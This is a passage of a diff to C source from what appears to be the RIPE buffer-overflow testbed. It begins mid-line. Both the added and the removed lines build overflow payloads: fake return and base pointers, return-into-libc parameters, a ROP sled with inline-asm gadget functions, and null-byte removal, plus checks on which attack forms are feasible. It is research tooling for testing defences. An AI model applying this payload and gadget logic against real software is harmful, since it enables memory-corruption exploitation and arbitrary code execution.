-       sizeof(long)); 
-
+  // Extend payload size
+  payload->size += (3 * sizeof(long));
+  // Allocate new payload buffer
+  temp_char_buffer = (char *)malloc(payload->size);
+  // Copy current payload to new payload buffer
+  memcpy(temp_char_buffer, payload->buffer, payload->size);
+  // Copy existing return address to new payload
+  memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
+   (payload->ptr_to_correct_return_addr),
+   sizeof(long));
+  // Free the old payload buffer
+  free(payload->buffer);
+  // Set the new payload buffer
+  payload->buffer = temp_char_buffer;
+  
+  /* Insert pointer to environment variable containing a          */
+  /* "/bin/sh" parameter for return-into-libc attacks             */
+  temp_char_ptr = getenv("param_to_creat"); // NN42
+  memcpy(&(payload->buffer[payload->size -
+         5 -               // NULL terminator
+         sizeof(long)]),   // the injected parameter
+   &temp_char_ptr,
+   sizeof(long));
 
   
+  //NN42: Inserting the permissions
+  memcpy(&(payload->buffer[payload->size - 1 -
+         sizeof(long)]),   // the injected parameter
+   &fake_esp_jmpbuff[14],
+   sizeof(long));
+   
+  /* Add the address to the direct or indirect target */
 
-      // Extend the payload to cover the return address
-      // The return address is not going to be changed
-      // since the attack targets the old base pointer
-      // but it's more robust to write the return address
-      // in its correct place instead of corrupting it
-      // with the terminating null char in the payload
-
-      // Extend payload size
-      payload->size += sizeof(long);
-      // Allocate new payload buffer
-      temp_char_buffer = (char *)malloc(payload->size);
-      // Copy current payload to new payload buffer
-      memcpy(temp_char_buffer, payload->buffer, payload->size);
-      // Copy existing return address to new payload
-      //      for(i = 1 ; i <= sizeof(long); i++) {
-      memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
-       (payload->ptr_to_correct_return_addr),
-       sizeof(long));
-
-
-      // Free the old payload buffer
-      free(payload->buffer);
-      // Set the new payload buffer
-      payload->buffer = temp_char_buffer;
-
-    } else if(attack.technique == INDIRECT) {
-      /* Insert fake return address after the fake old base pointer */
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             payload->offset_to_fake_return_addr]),
-       &payload->fake_return_addr,
-       sizeof(long));
-
-      /* Insert pointer to environment variable containing a          */
-      /* "/tmp/rip-eval/f_xxxx" parameter for return-into-libc attacks             */
-      temp_char_ptr = getenv("param_to_creat");
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             payload->offset_to_fake_return_addr +
-             sizeof(long)]),
-       &temp_char_ptr,
-       sizeof(long));
-
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             payload->offset_to_fake_return_addr +
-             2*sizeof(long)]),
-       &temp_char_ptr,
-       sizeof(long));      
-
-      //NN: Setting up the second parameter for the creat call, the file permissions
-      memcpy(&(payload->buffer[size_shellcode +
-             bytes_to_pad -
-             payload->offset_to_fake_return_addr +
-             3*sizeof(long)]),
-       &fake_esp_jmpbuff[14],
-       sizeof(long));  
-
-      /* Add the address to the direct or indirect target */
-      
-      memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
-       &payload->overflow_ptr,
-       sizeof(long));
-
-    } else {
-      if(output_error_msg) {
-        printf("Error: Unknown choice of attack parameter");
-      }
-      exit(1);
-    }
-  } else if(attack.technique == DIRECT && attack.code_ptr == RET_ADDR) {
-
-    /* Extend the payload to cover two memory addresses beyond the  */
-    /* return address and inject a pointer to environment variable  */
-    /* containing a "/bin/sh" parameter for return-into-libc attacks*/
-
-    if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING){
-      printf("ROP Sledding....;)\n");
-
-      // Extend payload size
-      payload->size += (7 * sizeof(long));
-      // Allocate new payload buffer
-      temp_char_buffer = (char *)malloc(payload->size);
-      // Copy current payload to new payload buffer
-      memcpy(temp_char_buffer, payload->buffer, payload->size);
-      // Copy existing return address to new payload
-      memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
-     (payload->ptr_to_correct_return_addr),
-     sizeof(long));
-
-      free(payload->buffer);
-      // Set the new payload buffer
-      payload->buffer = temp_char_buffer;
-
-      //Overwriting Return address with address of gadget1  
-      memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
-      &rop_sled,
-      7* sizeof(long));
-
-      /*
-      //Argument for 1st pop
-       memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
-      &gadget1,
-      sizeof(long));
-       */
-    }
-    else{
-
-    // Extend payload size
-    payload->size += (3 * sizeof(long));
-    // Allocate new payload buffer
-    temp_char_buffer = (char *)malloc(payload->size);
-    // Copy current payload to new payload buffer
-    memcpy(temp_char_buffer, payload->buffer, payload->size);
-    // Copy existing return address to new payload
-    memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
-     (payload->ptr_to_correct_return_addr),
-     sizeof(long));
-    // Free the old payload buffer
-    free(payload->buffer);
-    // Set the new payload buffer
-    payload->buffer = temp_char_buffer;
-    
-    /* Insert pointer to environment variable containing a          */
-    /* "/bin/sh" parameter for return-into-libc attacks             */
-    temp_char_ptr = getenv("param_to_creat"); // NN42
-    memcpy(&(payload->buffer[payload->size -
-           5 -               // NULL terminator
-           sizeof(long)]),   // the injected parameter
-     &temp_char_ptr,
-     sizeof(long));
-
-    
-    //NN42: Inserting the permissions
-    memcpy(&(payload->buffer[payload->size - 1 -
-           sizeof(long)]),   // the injected parameter
-     &fake_esp_jmpbuff[14],
-     sizeof(long));
-     
-    /* Add the address to the direct or indirect target */
-
-    memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
-     &payload->overflow_ptr,
-     sizeof(long));
-   }//Else of Non-return oriented programming closes
-
-  } else {
-    // Not a base pointer attack nor a direct attack against the ret
-    /* Add the address to the direct or indirect target */
-
-    memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
-     &payload->overflow_ptr,
-     sizeof(long));
-  }
-
-  /* If the payload happens to contain a null that null will */
-  /* terminate all string functions so we try removing it    */
-  if(!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)) {
-    remove_nulls(payload->buffer, payload->size);
-  }
+  memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
+   &payload->overflow_ptr,
+   sizeof(long));
 
   /* Finally, add the terminating null character at the end */
   memset((payload->buffer + payload->size - 1), '\0', 1);
@@ -1385,305 +446,3 @@ boolean contains_terminating_char(unsigned long value) {
   }
   return FALSE;
 }
-
-void remove_all_terminating_chars(char *contents, size_t length) {
-  size_t i;
-
-  for(i = 0; i < length; i++) {
-    if(contents[i] == '\0' ||      /* NUL */
-       contents[i] == '\r' ||      /* Carriage return */
-       contents[i] == '\n') {      /* New line (or Line feed) */
-      contents[i]++;
-    } else if(contents[i] == (char)0xff) {  /* -1 */
-      contents[i]--;
-    }
-  }
-}
-
-void remove_nulls(char *contents, size_t length) {
-  size_t i;
-
-  for(i = 0; i < length; i++) {
-    if(contents[i] == '\0')      /* NUL */
-      contents[i]++;
-  }
-}
-
-
-/* MEMORY DUMP FUNCTIONS */
-
-void print_payload_info(FILE *stream, CHARPAYLOAD *payload) {
-  switch(payload->inject_param) {
-  case INJECTED_CODE_NO_NOP:
-    fprintf(stream, "\nChar payload without NOP sled\n");
-    break;
-  case INJECTED_CODE_SIMPLE_NOP:
-    fprintf(stream, "\nChar payload with simple NOP sled\n");
-    break;
-  case INJECTED_CODE_POLY_NOP:
-    fprintf(stream, "\nChar payload with polymorphic NOP sled\n");
-    break;
-  case RETURN_INTO_LIBC:
-    fprintf(stream, "\nChar payload aimed at return into libc\n");
-    break;
-  case CREATE_FILE:
-    fprintf(stream, "\nChar payload aimed at creating a file in /tmp/rip-eval/\n");
-    break;
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of attack parameter");
-    }
-    exit(1);
-    break;
-  }
-
-  fprintf(stream, "Buffer size set: %i\n\n", payload->size);
-  //  printf("Actual buffer size: %i\n", sizeof(payload->buffer));
-  //  print_memory(stream, payload->buffer, payload->size);
-  //  fprintf(stream, "\n\n");
-}
-
-static char *pointer;  // Global to leave stack untouched
-
-void print_memory(FILE *stream, char *start, size_t words) {
-  for(pointer = start; pointer < (char *)(start + words); pointer += 4) {
-    fprintf(stream, "%p: 0x%x\n", pointer, *(unsigned int*)pointer);
-  }
-}
-
-static size_t iterator;
-
-void save_memory(MEM_DUMP *dump, char *start, size_t size) {
-  pointer = start;
-  for(iterator = 0; iterator < size; iterator++) {
-    snprintf(dump[iterator].address, HEX_STRING_SIZE,
-       "%p", pointer);
-    snprintf(dump[iterator].value, HEX_STRING_SIZE,
-       "0x%x", *(unsigned int*)pointer);
-    pointer += sizeof(long);
-  }
-}
-
-void print_two_memory_dumps(FILE *stream,
-          MEM_DUMP *dump1,
-          MEM_DUMP *dump2,
-          size_t size) {
-  fprintf(stream, "%-22s%-22s\n", "Memory dump 1", "Memory dump 2");
-  fprintf(stream, "%-11s%-11s%-11s%-11s\n\n",
-    "Address", "Value", "Value", "Address");
-  {
-    size_t i;
-    for(i = 0; i < size; i++) {
-      fprintf(stream, "%-11s%-11s%-11s%-11s\n",
-        dump1[i].address, dump1[i].value,
-        dump2[i].value, dump2[i].address);
-    }
-  }
-  fprintf(stream, "\n\n");
-}
-
-void print_three_memory_dumps(FILE *stream,
-            MEM_DUMP *dump1,
-            MEM_DUMP *dump2,
-            MEM_DUMP *dump3,
-            size_t size) {
-  fprintf(stream, "%-22s%-22s%-22s\n",
-    "Memory dump 1", "Memory dump 2", "Memory dump 3");
-  fprintf(stream, "%-11s%-11s%-11s%-11s%-11s%-11s\n",
-    "Address", "Value", "Value", "Address", "Value", "Address");
-  {
-    size_t i;
-    for(i = 0; i < size; i++) {
-      fprintf(stream, "%-11s%-11s%-11s%-11s%-11s%-11s\n",
-        dump1[i].address, dump1[i].value,
-        dump2[i].value, dump2[i].address,
-        dump3[i].value, dump3[i].address);
-    }
-  }
-  fprintf(stream, "\n\n");
-}
-
-/*************************************/
-/* Check for impossible attack forms */
-/*************************************/
-boolean is_attack_possible() {
-  switch(attack.location) {
-  case STACK:
-    if((attack.technique == DIRECT) &&
-       ((attack.code_ptr == FUNC_PTR_HEAP) ||
-        (attack.code_ptr == FUNC_PTR_BSS) ||
-        (attack.code_ptr == FUNC_PTR_DATA) ||
-        (attack.code_ptr == LONGJMP_BUF_HEAP) ||
-        (attack.code_ptr == LONGJMP_BUF_BSS) ||
-        (attack.code_ptr == LONGJMP_BUF_DATA) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
-      if(output_error_msg) {
-        printf("Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
-      }
-      return FALSE;
-    }
-    break;
-  case HEAP:
-    if((attack.technique == DIRECT) &&
-       ((attack.code_ptr == RET_ADDR) ||
-        (attack.code_ptr == OLD_BASE_PTR) ||
-        (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
-        (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
-        (attack.code_ptr == FUNC_PTR_BSS) ||
-        (attack.code_ptr == FUNC_PTR_DATA) ||
-        (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
-        (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
-        (attack.code_ptr == LONGJMP_BUF_BSS) ||
-        (attack.code_ptr == LONGJMP_BUF_DATA) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_BSS)  )) {
-      if(output_error_msg) {
-        printf("Error: Impossible perform a direct attack on the heap into another memory segment.\n");
-      }
-      return FALSE;
-    }
-    break;
-  case BSS:
-    if((attack.technique == DIRECT) &&
-       ((attack.code_ptr == RET_ADDR) ||
-        (attack.code_ptr == OLD_BASE_PTR) ||
-        (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
-        (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
-        (attack.code_ptr == FUNC_PTR_HEAP) ||
-        (attack.code_ptr == FUNC_PTR_DATA) ||
-        (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
-        (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
-        (attack.code_ptr == LONGJMP_BUF_HEAP) ||
-        (attack.code_ptr == LONGJMP_BUF_DATA) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_HEAP)  )) {
-      if(output_error_msg) {
-  printf("Error: Impossible to peform a direct attack in the BSS segment into another memory segment.\n");
-      }
-      return FALSE;
-    }
-    break;
-  case DATA:
-    if((attack.technique == DIRECT) &&
-       ((attack.code_ptr == RET_ADDR) ||
-        (attack.code_ptr == OLD_BASE_PTR) ||
-        (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
-        (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
-        (attack.code_ptr == FUNC_PTR_HEAP) ||
-        (attack.code_ptr == FUNC_PTR_BSS) ||
-        (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
-        (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
-        (attack.code_ptr == LONGJMP_BUF_HEAP) ||
-        (attack.code_ptr == LONGJMP_BUF_BSS) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
-        (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
-      if(output_error_msg) {
-        printf("Error: Impossible to perform a direct attack in the Data segment into another memory segment.\n");
-      }
-
-
-      return FALSE;
-    }
-    break;
-  default:
-    if(output_error_msg) {
-      printf("Error: Unknown choice of buffer location\n");
-    }
-    return FALSE;
-  }
-
-  // Indirect attacks doing return-into-libc are considered
-  // impossible since the attacker cannot inject a parameter,
-  // e.g. the parameter "/bin/sh" to system().
-  // The exception to the rule is an attack against the old
-  // base pointer we're the attacker injects a whole fake
-  // stack frame.
-  if(attack.technique == INDIRECT &&
-     attack.inject_param == RETURN_INTO_LIBC &&
-     attack.code_ptr != OLD_BASE_PTR) {
-    if(output_error_msg) {
-      printf("Error: Impossible to perform an indirect return-into-libc attack since parameters for the libc function cannot be injected.\n");
-    }
-    return FALSE;
-  }
-
-  //NN For now only direct attacks to struct_func
-  switch (attack.code_ptr){
-    case STRUCT_FUNC_PTR_STACK:
-    case STRUCT_FUNC_PTR_HEAP:
-    case STRUCT_FUNC_PTR_DATA:
-    case STRUCT_FUNC_PTR_BSS:
-      if(attack.technique != DIRECT) {
-        printf("Error: Impossible...for now at least :)\n");
-        return FALSE;
-      }
-      break;
-   default:
-  break;  
- }
-  if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING && (attack.technique != DIRECT || attack.code_ptr != RET_ADDR)){
-     printf("Error: Impossible...for now at least :)\n");
-     return FALSE;
-  }
-
-  return TRUE;
-}
-
-void homebrew_memcpy(void *dst, const void *src, size_t length) {
-  char *d, *s;
-
-  d = (char *)dst;
-  s = (char *)src;
-
-  while(length--) {
-    *d++ = *s++;
-  }
-}
-
-//NN: Dummy functions used to create gadgets for the ROP attack
-
-void gadget1(int a, int b){
-   int arthur,dent,j;
-   arthur = a + b / 42;
-
-   for(j=0;j<10;j++);
-   //Gadget 1, locate at gardget1 + 62 bytes
-   asm("nop"); //Using this to find it easier in dissas code
-   asm("pop %eax"); //FFFFFFFF => 8
-   asm("add $9, %eax");
-   asm("ret");
-   
-   return;
-
-}
-void gadget2(int a, int b){
-   int ford,prefect,j;
-   ford = a + b / 43;
-   //Gadget 1, locate at gadget2 + 62 bytes
-   for(j=0;j<10;j++);
-   asm("nop"); 
-   asm("pop %ebx");
-   asm("pop %ecx");  //FFFFFFFF => 448
-   asm("add $449, %ecx");
-   asm("ret");
-   
-   return;
-
-}
-int gadget3(int a, int b){
-   int i,j;
-   i = a + b / 33;
-
-   for(j=0;j<10;j++);
-   //Gadget3 starts here, located at gadget3 + 62 bytes
-   asm("nop");
-   asm("int $0x80");
-
-  return 42;
-}
-
